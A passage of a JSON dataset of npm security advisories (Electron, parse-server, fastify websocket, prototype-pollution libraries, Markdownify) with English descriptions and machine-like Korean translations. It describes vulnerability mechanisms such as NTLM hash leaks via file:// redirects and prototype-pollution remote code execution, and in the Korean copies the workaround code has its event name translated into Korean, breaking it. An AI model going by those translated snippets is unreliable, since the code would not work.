    "description": "### Impact\nWhen following a redirect, Electron delays a check for redirecting to file:// URLs from other schemes. The contents of the file is not available to the renderer following the redirect, but if the redirect target is a SMB URL such as `file://some.website.com/`, then in some cases, Windows will connect to that server and attempt NTLM authentication, which can include sending hashed credentials.\n\n### Patches\nThis issue has been fixed in all current stable versions of Electron. Specifically, these versions contain the fixes:\n\n- 21.0.0-beta.1\n- 20.0.1\n- 19.0.11\n- 18.3.7\n\nWe recommend all apps upgrade to the latest stable version of Electron.\n\n### Workarounds\nIf upgrading isn't possible, this issue can be addressed without upgrading by preventing redirects to file:// URLs in the `WebContents.on('will-redirect')` event, for all WebContents:\n\n```js\napp.on('web-contents-created', (e, webContents) => {\n  webContents.on('will-redirect', (e, url) => {\n    if (/^file:/.test(url)) e.preventDefault()\n  })\n})\n```\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).\n\n### Credit\nThanks to user @coolcoolnoworries for reporting this issue.",
    "identifiers": "GHSA : GHSA-p2jh-44qj-pf2v\nCVE : CVE-2022-36077",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:06:46Z",
    "publishedAt": "2022-11-10T12:38:57Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-p2jh-44qj-pf2v\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36077\nhttps://github.com/advisories/GHSA-p2jh-44qj-pf2v",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 19.0.0-beta.1, < 19.0.11",
    "identifier": "19.0.11",
    "descriptionKR": "### 영향\n리디렉션을 따를 때 Electron은 다른 체계에서 file:// URL로 리디렉션되는지 확인을 지연합니다. 파일의 내용은 리디렉션 후 렌더러에서 사용할 수 없지만 리디렉션 대상이 `file://some.website.com/`과 같은 SMB URL인 경우 경우에 따라 Windows가 해당 서버에 연결합니다. 해시된 자격 증명 전송을 포함할 수 있는 NTLM 인증을 시도합니다.\n\n### 패치\n이 문제는 현재 Electron의 모든 안정 버전에서 수정되었습니다. 특히 이러한 버전에는 수정 사항이 포함되어 있습니다.\n\n- 21.0.0-베타.1\n- 20.0.1\n- 19.0.11\n- 18.3.7\n\n모든 앱을 최신 안정 버전의 Electron으로 업그레이드할 것을 권장합니다.\n\n### 해결 방법\n업그레이드가 불가능한 경우 모든 WebContents에 대해 `WebContents.on('will-redirect')` 이벤트에서 file:// URL로의 리디렉션을 방지하여 업그레이드하지 않고 이 문제를 해결할 수 있습니다.\n\n```js\napp.on('웹 콘텐츠 생성', (e, webContents) => {\n  webContents.on('will-redirect', (e, url) => {\n    if (/^file:/.test(url)) e.preventDefault()\n  })\n})\n```\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오.\n\n### 신용 거래\n이 문제를 보고해 주신 @coolcoolnoworries 사용자에게 감사드립니다."
  },
  {
    "description": "### Impact\nWhen following a redirect, Electron delays a check for redirecting to file:// URLs from other schemes. The contents of the file is not available to the renderer following the redirect, but if the redirect target is a SMB URL such as `file://some.website.com/`, then in some cases, Windows will connect to that server and attempt NTLM authentication, which can include sending hashed credentials.\n\n### Patches\nThis issue has been fixed in all current stable versions of Electron. Specifically, these versions contain the fixes:\n\n- 21.0.0-beta.1\n- 20.0.1\n- 19.0.11\n- 18.3.7\n\nWe recommend all apps upgrade to the latest stable version of Electron.\n\n### Workarounds\nIf upgrading isn't possible, this issue can be addressed without upgrading by preventing redirects to file:// URLs in the `WebContents.on('will-redirect')` event, for all WebContents:\n\n```js\napp.on('web-contents-created', (e, webContents) => {\n  webContents.on('will-redirect', (e, url) => {\n    if (/^file:/.test(url)) e.preventDefault()\n  })\n})\n```\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).\n\n### Credit\nThanks to user @coolcoolnoworries for reporting this issue.",
    "identifiers": "GHSA : GHSA-p2jh-44qj-pf2v\nCVE : CVE-2022-36077",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:06:46Z",
    "publishedAt": "2022-11-10T12:38:57Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-p2jh-44qj-pf2v\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36077\nhttps://github.com/advisories/GHSA-p2jh-44qj-pf2v",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 20.0.0-beta.1, < 20.0.1",
    "identifier": "20.0.1",
    "descriptionKR": "### 영향\n리디렉션을 따를 때 Electron은 다른 체계에서 file:// URL로 리디렉션되는지 확인을 지연합니다. 파일의 내용은 리디렉션 후 렌더러에서 사용할 수 없지만 리디렉션 대상이 `file://some.website.com/`과 같은 SMB URL인 경우 경우에 따라 Windows가 해당 서버에 연결합니다. 해시된 자격 증명 전송을 포함할 수 있는 NTLM 인증을 시도합니다.\n\n### 패치\n이 문제는 현재 Electron의 모든 안정 버전에서 수정되었습니다. 특히 이러한 버전에는 수정 사항이 포함되어 있습니다.\n\n- 21.0.0-베타.1\n- 20.0.1\n- 19.0.11\n- 18.3.7\n\n모든 앱을 최신 안정 버전의 Electron으로 업그레이드할 것을 권장합니다.\n\n### 해결 방법\n업그레이드가 불가능한 경우 모든 WebContents에 대해 `WebContents.on('will-redirect')` 이벤트에서 file:// URL로의 리디렉션을 방지하여 업그레이드하지 않고 이 문제를 해결할 수 있습니다.\n\n```js\napp.on('웹 콘텐츠 생성', (e, webContents) => {\n  webContents.on('will-redirect', (e, url) => {\n    if (/^file:/.test(url)) e.preventDefault()\n  })\n})\n```\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오.\n\n### 신용 거래\n이 문제를 보고해 주신 @coolcoolnoworries 사용자에게 감사드립니다."
  },
  {
    "description": "### Impact\nWhen following a redirect, Electron delays a check for redirecting to file:// URLs from other schemes. The contents of the file is not available to the renderer following the redirect, but if the redirect target is a SMB URL such as `file://some.website.com/`, then in some cases, Windows will connect to that server and attempt NTLM authentication, which can include sending hashed credentials.\n\n### Patches\nThis issue has been fixed in all current stable versions of Electron. Specifically, these versions contain the fixes:\n\n- 21.0.0-beta.1\n- 20.0.1\n- 19.0.11\n- 18.3.7\n\nWe recommend all apps upgrade to the latest stable version of Electron.\n\n### Workarounds\nIf upgrading isn't possible, this issue can be addressed without upgrading by preventing redirects to file:// URLs in the `WebContents.on('will-redirect')` event, for all WebContents:\n\n```js\napp.on('web-contents-created', (e, webContents) => {\n  webContents.on('will-redirect', (e, url) => {\n    if (/^file:/.test(url)) e.preventDefault()\n  })\n})\n```\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).\n\n### Credit\nThanks to user @coolcoolnoworries for reporting this issue.",
    "identifiers": "GHSA : GHSA-p2jh-44qj-pf2v\nCVE : CVE-2022-36077",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:06:46Z",
    "publishedAt": "2022-11-10T12:38:57Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-p2jh-44qj-pf2v\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36077\nhttps://github.com/advisories/GHSA-p2jh-44qj-pf2v",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 18.3.7",
    "identifier": "18.3.7",
    "descriptionKR": "### 영향\n리디렉션을 따를 때 Electron은 다른 체계에서 file:// URL로 리디렉션되는지 확인을 지연합니다. 파일의 내용은 리디렉션 후 렌더러에서 사용할 수 없지만 리디렉션 대상이 `file://some.website.com/`과 같은 SMB URL인 경우 경우에 따라 Windows가 해당 서버에 연결합니다. 해시된 자격 증명 전송을 포함할 수 있는 NTLM 인증을 시도합니다.\n\n### 패치\n이 문제는 현재 Electron의 모든 안정 버전에서 수정되었습니다. 특히 이러한 버전에는 수정 사항이 포함되어 있습니다.\n\n- 21.0.0-베타.1\n- 20.0.1\n- 19.0.11\n- 18.3.7\n\n모든 앱을 최신 안정 버전의 Electron으로 업그레이드할 것을 권장합니다.\n\n### 해결 방법\n업그레이드가 불가능한 경우 모든 WebContents에 대해 `WebContents.on('will-redirect')` 이벤트에서 file:// URL로의 리디렉션을 방지하여 업그레이드하지 않고 이 문제를 해결할 수 있습니다.\n\n```js\napp.on('웹 콘텐츠 생성', (e, webContents) => {\n  webContents.on('will-redirect', (e, url) => {\n    if (/^file:/.test(url)) e.preventDefault()\n  })\n})\n```\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오.\n\n### 신용 거래\n이 문제를 보고해 주신 @coolcoolnoworries 사용자에게 감사드립니다."
  },
  {
    "description": "### Impact\n\nKeywords that are specified in the Parse Server option `requestKeywordDenylist` can be injected via Cloud Code Webhooks or Triggers. This will result in the keyword being saved to the database, bypassing the `requestKeywordDenylist` option.\n\n### Patches\n\nImproved keyword detection.\n\n### Workarounds\n\nConfigure your firewall to only allow trusted servers to make request to the Parse Server Cloud Code Webhooks API, or block the API completely if you are not using the feature.\n\n### Collaborators\n\nMikhail Shcherbakov, Cristian-Alexandru Staicu and Musard Balliu working with Trend Micro Zero Day Initiative",
    "identifiers": "GHSA : GHSA-xprv-wvh7-qqqx\nCVE : CVE-2022-41878",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:08:37Z",
    "publishedAt": "2022-11-09T20:47:27Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-xprv-wvh7-qqqx\nhttps://github.com/parse-community/parse-server/pull/8301\nhttps://github.com/parse-community/parse-server/pull/8302\nhttps://github.com/parse-community/parse-server/commit/0a2d412e265992d53a670011afd9d2578562adc3\nhttps://github.com/parse-community/parse-server/commit/6728da1e3591db1e27031d335d64d8f25546a06f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41878\nhttps://github.com/advisories/GHSA-xprv-wvh7-qqqx",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.3.2",
    "identifier": "5.3.2",
    "descriptionKR": "### 영향\n\nParse Server 옵션 'requestKeywordDenylist'에 지정된 키워드는 Cloud Code 웹후크 또는 트리거를 통해 삽입할 수 있습니다. 이렇게 하면 키워드가 'requestKeywordDenylist' 옵션을 우회하여 데이터베이스에 저장됩니다.\n\n### 패치\n\n향상된 키워드 감지.\n\n### 해결 방법\n\n신뢰할 수 있는 서버만 Parse Server Cloud Code Webhooks API에 요청할 수 있도록 방화벽을 구성하거나 기능을 사용하지 않는 경우 API를 완전히 차단하십시오.\n\n### 협력자\n\nTrend Micro Zero Day Initiative에서 일하는 Mikhail Shcherbakov, Cristian-Alexandru Staicu 및 Musard Balliu"
  },
  {
    "description": "### Impact\n\nKeywords that are specified in the Parse Server option `requestKeywordDenylist` can be injected via Cloud Code Webhooks or Triggers. This will result in the keyword being saved to the database, bypassing the `requestKeywordDenylist` option.\n\n### Patches\n\nImproved keyword detection.\n\n### Workarounds\n\nConfigure your firewall to only allow trusted servers to make request to the Parse Server Cloud Code Webhooks API, or block the API completely if you are not using the feature.\n\n### Collaborators\n\nMikhail Shcherbakov, Cristian-Alexandru Staicu and Musard Balliu working with Trend Micro Zero Day Initiative",
    "identifiers": "GHSA : GHSA-xprv-wvh7-qqqx\nCVE : CVE-2022-41878",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:08:37Z",
    "publishedAt": "2022-11-09T20:47:27Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-xprv-wvh7-qqqx\nhttps://github.com/parse-community/parse-server/pull/8301\nhttps://github.com/parse-community/parse-server/pull/8302\nhttps://github.com/parse-community/parse-server/commit/0a2d412e265992d53a670011afd9d2578562adc3\nhttps://github.com/parse-community/parse-server/commit/6728da1e3591db1e27031d335d64d8f25546a06f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41878\nhttps://github.com/advisories/GHSA-xprv-wvh7-qqqx",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.19",
    "identifier": "4.10.19",
    "descriptionKR": "### 영향\n\nParse Server 옵션 'requestKeywordDenylist'에 지정된 키워드는 Cloud Code 웹후크 또는 트리거를 통해 삽입할 수 있습니다. 이렇게 하면 키워드가 'requestKeywordDenylist' 옵션을 우회하여 데이터베이스에 저장됩니다.\n\n### 패치\n\n향상된 키워드 감지.\n\n### 해결 방법\n\n신뢰할 수 있는 서버만 Parse Server Cloud Code Webhooks API에 요청할 수 있도록 방화벽을 구성하거나 기능을 사용하지 않는 경우 API를 완전히 차단하십시오.\n\n### 협력자\n\nTrend Micro Zero Day Initiative에서 일하는 Mikhail Shcherbakov, Cristian-Alexandru Staicu 및 Musard Balliu"
  },
  {
    "description": "## Withdrawn\n\nThis advisory has been withdrawn because it is a test.\n\n## Original Description\n\n### Impact\nUsers can include their own images for accessories via provided URLs. These URLs are not validated and can result in execution of injected code.\n\n### Patches\nThis vulnerability was fixed in version 1.2 of octocat.js\n\n### Workarounds\nDirectly exposing rendered images to a website can introduce the vulnerability to users. To avoid, writing an image to disk then using that image in an image element in HTML mitigates the risk.\n\n### References\nTo render the file correctly, see documentation at `readme.md`\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the octo.js repository](http://github.com/octocademy/octocat.js/issues)\n",
    "identifiers": "GHSA : GHSA-r4jg-5v89-9v62\nCVE : CVE-2022-39390",
    "severity": "HIGH",
    "updatedAt": "2023-02-24T16:37:51Z",
    "publishedAt": "2022-11-08T20:48:49Z",
    "withdrawnAt": "2022-11-09T22:35:46Z",
    "references": "https://github.com/octocademy/octocat.js/security/advisories/GHSA-r4jg-5v89-9v62\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39390\nhttps://github.com/advisories/GHSA-r4jg-5v89-9v62",
    "name": "octocat.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2",
    "identifier": "1.2",
    "descriptionKR": "## 철회\n\n이 권고는 테스트이므로 철회되었습니다.\n\n## 원본 설명\n\n### 영향\n사용자는 제공된 URL을 통해 자신의 액세서리 이미지를 포함할 수 있습니다. 이러한 URL은 검증되지 않으며 삽입된 코드가 실행될 수 있습니다.\n\n### 패치\n이 취약점은 octocat.js 버전 1.2에서 수정되었습니다.\n\n### 해결 방법\n렌더링된 이미지를 웹 사이트에 직접 노출하면 사용자에게 취약점이 발생할 수 있습니다. 이를 방지하기 위해 이미지를 디스크에 쓴 다음 HTML의 이미지 요소에서 해당 이미지를 사용하면 위험이 완화됩니다.\n\n### 참조\n파일을 올바르게 렌더링하려면 `readme.md`의 설명서를 참조하십시오.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [octo.js 저장소](http://github.com/octocademy/octocat.js/issues)에서 이슈 열기"
  },
  {
    "description": "### Impact\n\nAn attacker can use this prototype pollution sink to trigger a remote code execution through the MongoDB BSON parser. \n\n### Patches\n\nPrevent prototype pollution in MongoDB database adapter.\n\n### Workarounds\n\nDisable remote code execution through the MongoDB BSON parser.\n\n### Collaborators\n\nMikhail Shcherbakov (KTH), Cristian-Alexandru Staicu (CISPA) and Musard Balliu (KTH) working with Trend Micro Zero Day Initiative\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-prm5-8g2m-24gg\n",
    "identifiers": "GHSA : GHSA-prm5-8g2m-24gg\nCVE : CVE-2022-39396",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:08:11Z",
    "publishedAt": "2022-11-08T17:29:16Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-prm5-8g2m-24gg\nhttps://github.com/parse-community/parse-server/pull/8295\nhttps://github.com/parse-community/parse-server/pull/8296\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.18\nhttps://github.com/parse-community/parse-server/releases/tag/5.3.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39396\nhttps://github.com/advisories/GHSA-prm5-8g2m-24gg",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.3.1",
    "identifier": "5.3.1",
    "descriptionKR": "### 영향\n\n공격자는 이 프로토타입 오염 싱크를 사용하여 MongoDB BSON 파서를 통해 원격 코드 실행을 트리거할 수 있습니다.\n\n### 패치\n\nMongoDB 데이터베이스 어댑터의 프로토타입 오염을 방지합니다.\n\n### 해결 방법\n\nMongoDB BSON 파서를 통해 원격 코드 실행을 비활성화합니다.\n\n### 협력자\n\nTrend Micro Zero Day Initiative에서 일하는 Mikhail Shcherbakov(KTH), Cristian-Alexandru Staicu(CISPA) 및 Musard Balliu(KTH)\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-prm5-8g2m-24gg"
  },
  {
    "description": "### Impact\n\nAn attacker can use this prototype pollution sink to trigger a remote code execution through the MongoDB BSON parser. \n\n### Patches\n\nPrevent prototype pollution in MongoDB database adapter.\n\n### Workarounds\n\nDisable remote code execution through the MongoDB BSON parser.\n\n### Collaborators\n\nMikhail Shcherbakov (KTH), Cristian-Alexandru Staicu (CISPA) and Musard Balliu (KTH) working with Trend Micro Zero Day Initiative\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-prm5-8g2m-24gg\n",
    "identifiers": "GHSA : GHSA-prm5-8g2m-24gg\nCVE : CVE-2022-39396",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:08:11Z",
    "publishedAt": "2022-11-08T17:29:16Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-prm5-8g2m-24gg\nhttps://github.com/parse-community/parse-server/pull/8295\nhttps://github.com/parse-community/parse-server/pull/8296\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.18\nhttps://github.com/parse-community/parse-server/releases/tag/5.3.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39396\nhttps://github.com/advisories/GHSA-prm5-8g2m-24gg",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.18",
    "identifier": "4.10.18",
    "descriptionKR": "### 영향\n\n공격자는 이 프로토타입 오염 싱크를 사용하여 MongoDB BSON 파서를 통해 원격 코드 실행을 트리거할 수 있습니다.\n\n### 패치\n\nMongoDB 데이터베이스 어댑터의 프로토타입 오염을 방지합니다.\n\n### 해결 방법\n\nMongoDB BSON 파서를 통해 원격 코드 실행을 비활성화합니다.\n\n### 협력자\n\nTrend Micro Zero Day Initiative에서 일하는 Mikhail Shcherbakov(KTH), Cristian-Alexandru Staicu(CISPA) 및 Musard Balliu(KTH)\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-prm5-8g2m-24gg"
  },
  {
    "description": "fastest-json-copy version 1.0.1 allows an external attacker to edit or add new properties to an object. This is possible because the application does not correctly validate the incoming JSON keys, thus allowing the `__proto__` property to be edited.",
    "identifiers": "GHSA : GHSA-p5g9-rjcf-95vj\nCVE : CVE-2022-41714",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:06:18Z",
    "publishedAt": "2022-11-04T12:00:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41714\nhttps://fluidattacks.com/advisories/guetta/\nhttps://github.com/streamich/fastest-json-copy\nhttps://github.com/advisories/GHSA-p5g9-rjcf-95vj",
    "name": "fastest-json-copy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.1",
    "descriptionKR": "가장 빠른 json-copy 버전 1.0.1을 사용하면 외부 공격자가 개체에 새 속성을 편집하거나 추가할 수 있습니다. 이는 애플리케이션이 들어오는 JSON 키의 유효성을 올바르게 검사하지 않아 `__proto__` 속성을 편집할 수 있기 때문에 가능합니다."
  },
  {
    "description": "deep-parse-json version 1.0.2 allows an external attacker to edit or add new properties to an object. This is possible because the application does not correctly validate the incoming JSON keys, thus allowing the `__proto__` property to be edited.",
    "identifiers": "GHSA : GHSA-ff9j-pwxg-q5p2\nCVE : CVE-2022-42743",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:05:54Z",
    "publishedAt": "2022-11-04T12:00:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-42743\nhttps://fluidattacks.com/advisories/buuren/\nhttps://github.com/sibu-github/deep-parse-json/issues/6\nhttps://github.com/advisories/GHSA-ff9j-pwxg-q5p2",
    "name": "deep-parse-json",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.2",
    "descriptionKR": "deep-parse-json 버전 1.0.2를 사용하면 외부 공격자가 개체에 새 속성을 편집하거나 추가할 수 있습니다. 이는 애플리케이션이 들어오는 JSON 키의 유효성을 올바르게 검사하지 않아 `__proto__` 속성을 편집할 수 있기 때문에 가능합니다."
  },
  {
    "description": "### Impact\n\nAny application using @fastify/websocket could crash if a specific, malformed packet is sent. \n\nAll versions of fastify-websocket are also impacted. That module is deprecated, so it will not be patched.\n\n### Patches\n\nThis has been patched in v7.1.1 (fastify v4) and v5.0.1 (fastify v3).\n\n### Workarounds\n\nNo known workaround is available. However, it should be possible to attach the error handler manually.\nThe recommended path is upgrading to the patched versions.\n\n## Credits\n\n[marcolanaro](https://github.com/marcolanaro) for finding and patching this vulnerability\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [@fastify/websocket](https://github.com/fastify/fastify-websocket)\n* Email us at [hello@matteocollina.com](mailto:hello@matteocollina.com)\n",
    "identifiers": "GHSA : GHSA-4pcg-wr6c-h9cq\nCVE : CVE-2022-39386",
    "severity": "HIGH",
    "updatedAt": "2023-03-29T15:52:21Z",
    "publishedAt": "2022-11-07T21:13:57Z",
    "references": "https://github.com/fastify/fastify-websocket/security/advisories/GHSA-4pcg-wr6c-h9cq\nhttps://github.com/fastify/fastify-websocket/releases/tag/v5.0.1\nhttps://github.com/fastify/fastify-websocket/releases/tag/v7.1.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39386\nhttps://github.com/fastify/fastify-websocket/pull/228\nhttps://github.com/fastify/fastify-websocket/commit/7e8c41a51c101c3d5ce88caee4f71d9c29eb2863\nhttps://github.com/fastify/fastify-websocket/commit/c24adeb3efd57a18b2f287c35d029e88b5a47194\nhttps://github.com/advisories/GHSA-4pcg-wr6c-h9cq",
    "name": "@fastify/websocket",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.1",
    "identifier": "5.0.1",
    "descriptionKR": "### 영향\n\n@fastify/websocket을 사용하는 모든 응용 프로그램은 잘못된 특정 패킷이 전송되는 경우 충돌할 수 있습니다.\n\nfastify-websocket의 모든 버전도 영향을 받습니다. 해당 모듈은 더 이상 사용되지 않으므로 패치되지 않습니다.\n\n### 패치\n\n이는 v7.1.1(fastify v4) 및 v5.0.1(fastify v3)에서 패치되었습니다.\n\n### 해결 방법\n\n사용 가능한 알려진 해결 방법이 없습니다. 그러나 오류 처리기를 수동으로 연결할 수 있어야 합니다.\n권장 경로는 패치된 버전으로 업그레이드하는 것입니다.\n\n## 학점\n\n[marcolanaro](https://github.com/marcolanaro) 이 취약점을 찾아 패치했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [@fastify/websocket](https://github.com/fastify/fastify-websocket)에서 이슈 열기\n* [hello@matteocollina.com](mailto:hello@matteocollina.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nAny application using @fastify/websocket could crash if a specific, malformed packet is sent. \n\nAll versions of fastify-websocket are also impacted. That module is deprecated, so it will not be patched.\n\n### Patches\n\nThis has been patched in v7.1.1 (fastify v4) and v5.0.1 (fastify v3).\n\n### Workarounds\n\nNo known workaround is available. However, it should be possible to attach the error handler manually.\nThe recommended path is upgrading to the patched versions.\n\n## Credits\n\n[marcolanaro](https://github.com/marcolanaro) for finding and patching this vulnerability\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [@fastify/websocket](https://github.com/fastify/fastify-websocket)\n* Email us at [hello@matteocollina.com](mailto:hello@matteocollina.com)\n",
    "identifiers": "GHSA : GHSA-4pcg-wr6c-h9cq\nCVE : CVE-2022-39386",
    "severity": "HIGH",
    "updatedAt": "2023-03-29T15:52:21Z",
    "publishedAt": "2022-11-07T21:13:57Z",
    "references": "https://github.com/fastify/fastify-websocket/security/advisories/GHSA-4pcg-wr6c-h9cq\nhttps://github.com/fastify/fastify-websocket/releases/tag/v5.0.1\nhttps://github.com/fastify/fastify-websocket/releases/tag/v7.1.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39386\nhttps://github.com/fastify/fastify-websocket/pull/228\nhttps://github.com/fastify/fastify-websocket/commit/7e8c41a51c101c3d5ce88caee4f71d9c29eb2863\nhttps://github.com/fastify/fastify-websocket/commit/c24adeb3efd57a18b2f287c35d029e88b5a47194\nhttps://github.com/advisories/GHSA-4pcg-wr6c-h9cq",
    "name": "fastify-websocket",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.3.0",
    "descriptionKR": "### 영향\n\n@fastify/websocket을 사용하는 모든 응용 프로그램은 잘못된 특정 패킷이 전송되는 경우 충돌할 수 있습니다.\n\nfastify-websocket의 모든 버전도 영향을 받습니다. 해당 모듈은 더 이상 사용되지 않으므로 패치되지 않습니다.\n\n### 패치\n\n이는 v7.1.1(fastify v4) 및 v5.0.1(fastify v3)에서 패치되었습니다.\n\n### 해결 방법\n\n사용 가능한 알려진 해결 방법이 없습니다. 그러나 오류 처리기를 수동으로 연결할 수 있어야 합니다.\n권장 경로는 패치된 버전으로 업그레이드하는 것입니다.\n\n## 학점\n\n[marcolanaro](https://github.com/marcolanaro) 이 취약점을 찾아 패치했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [@fastify/websocket](https://github.com/fastify/fastify-websocket)에서 이슈 열기\n* [hello@matteocollina.com](mailto:hello@matteocollina.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nAny application using @fastify/websocket could crash if a specific, malformed packet is sent. \n\nAll versions of fastify-websocket are also impacted. That module is deprecated, so it will not be patched.\n\n### Patches\n\nThis has been patched in v7.1.1 (fastify v4) and v5.0.1 (fastify v3).\n\n### Workarounds\n\nNo known workaround is available. However, it should be possible to attach the error handler manually.\nThe recommended path is upgrading to the patched versions.\n\n## Credits\n\n[marcolanaro](https://github.com/marcolanaro) for finding and patching this vulnerability\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [@fastify/websocket](https://github.com/fastify/fastify-websocket)\n* Email us at [hello@matteocollina.com](mailto:hello@matteocollina.com)\n",
    "identifiers": "GHSA : GHSA-4pcg-wr6c-h9cq\nCVE : CVE-2022-39386",
    "severity": "HIGH",
    "updatedAt": "2023-03-29T15:52:21Z",
    "publishedAt": "2022-11-07T21:13:57Z",
    "references": "https://github.com/fastify/fastify-websocket/security/advisories/GHSA-4pcg-wr6c-h9cq\nhttps://github.com/fastify/fastify-websocket/releases/tag/v5.0.1\nhttps://github.com/fastify/fastify-websocket/releases/tag/v7.1.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39386\nhttps://github.com/fastify/fastify-websocket/pull/228\nhttps://github.com/fastify/fastify-websocket/commit/7e8c41a51c101c3d5ce88caee4f71d9c29eb2863\nhttps://github.com/fastify/fastify-websocket/commit/c24adeb3efd57a18b2f287c35d029e88b5a47194\nhttps://github.com/advisories/GHSA-4pcg-wr6c-h9cq",
    "name": "@fastify/websocket",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 7.1.1",
    "identifier": "7.1.1",
    "descriptionKR": "### 영향\n\n@fastify/websocket을 사용하는 모든 응용 프로그램은 잘못된 특정 패킷이 전송되는 경우 충돌할 수 있습니다.\n\nfastify-websocket의 모든 버전도 영향을 받습니다. 해당 모듈은 더 이상 사용되지 않으므로 패치되지 않습니다.\n\n### 패치\n\n이는 v7.1.1(fastify v4) 및 v5.0.1(fastify v3)에서 패치되었습니다.\n\n### 해결 방법\n\n사용 가능한 알려진 해결 방법이 없습니다. 그러나 오류 처리기를 수동으로 연결할 수 있어야 합니다.\n권장 경로는 패치된 버전으로 업그레이드하는 것입니다.\n\n## 학점\n\n[marcolanaro](https://github.com/marcolanaro) 이 취약점을 찾아 패치했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [@fastify/websocket](https://github.com/fastify/fastify-websocket)에서 이슈 열기\n* [hello@matteocollina.com](mailto:hello@matteocollina.com)으로 이메일을 보내주세요."
  },
  {
    "description": "Markdownify version 1.4.1 allows an external attacker to remotely obtain arbitrary local files on any client that attempts to view a malicious markdown file through Markdownify. This is possible because the application does not have a CSP policy (or at least not strict enough) and/or does not properly validate the contents of markdown files before rendering them.",
    "identifiers": "GHSA : GHSA-qqhf-xfhw-7884\nCVE : CVE-2022-41710",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:03:53Z",
    "publishedAt": "2022-11-04T12:00:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41710\nhttps://fluidattacks.com/advisories/noisestorm/\nhttps://github.com/amitmerchant1990/electron-markdownify\nhttps://github.com/advisories/GHSA-qqhf-xfhw-7884",
    "name": "electron-markdownify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.1",
